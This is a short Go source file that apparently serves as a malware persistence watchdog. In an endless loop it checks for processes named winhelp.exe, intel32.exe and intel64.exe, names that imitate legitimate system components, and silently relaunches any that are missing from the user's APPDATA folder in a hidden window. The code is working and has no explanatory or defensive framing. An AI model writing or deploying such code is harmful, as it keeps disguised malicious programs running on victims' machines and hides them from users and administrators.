//package main
// +build !darwin
package util

import (
	"os/exec"
	"syscall"
	"time"

	"github.com/mitchellh/go-ps"
)

func openProcess(name string) {
	run := exec.Command("cmd", "/C", "start %APPDATA%\\Windows\\"+name)
	run.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	run.Run()
}

func persist() {
	programs := map[string]bool{}
	for {
		programs["winhelp.exe"] = false
		programs["intel32.exe"] = false
		programs["intel64.exe"] = false
		time.Sleep(500000000)
		ls, _ := ps.Processes()
		for _, p := range ls {
			if _, ok := programs[p.Executable()]; ok {
				programs[p.Executable()] = true
			}
		}
		for name, p := range programs {
			if !p {
				openProcess(name)
			}
		}
	}
}

func main() {
	persist()
}